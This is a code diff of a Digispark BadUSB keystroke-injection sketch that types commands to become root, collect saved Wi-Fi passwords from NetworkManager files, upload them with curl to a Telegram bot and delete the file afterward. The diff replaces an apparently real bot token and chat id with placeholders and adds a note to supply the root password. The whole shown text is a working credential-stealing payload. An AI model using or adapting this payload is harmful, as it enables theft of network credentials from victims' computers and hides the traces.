@@ -18,13 +18,13 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.println("su");
   DigiKeyboard.delay(120);
-  DigiKeyboard.println("123");
+  DigiKeyboard.println("123"); // enter your actual root password
   DigiKeyboard.delay(500);
   DigiKeyboard.println("grep psk= /etc/NetworkManager/system-connections/* > ~/wifi_passwords.txt"); 
   DigiKeyboard.delay(500);
   
  
-  DigiKeyboard.println("curl -F \"document=@wifi_passwords.txt\" https://api.telegram.org/bot7041115900:AAHtHncvWaZAE1ED4S9XIChdfTOqP95BT4c/sendDocument?chat_id=6100927257"); 
+  DigiKeyboard.println("curl -F \"document=@wifi_passwords.txt\" https://api.telegram.org/bot<your-bot-api-key>/sendDocument?chat_id=<chat-id>"); 
   DigiKeyboard.delay(1000);
   
   DigiKeyboard.println("rm -rf wifi_passwords.txt"); 
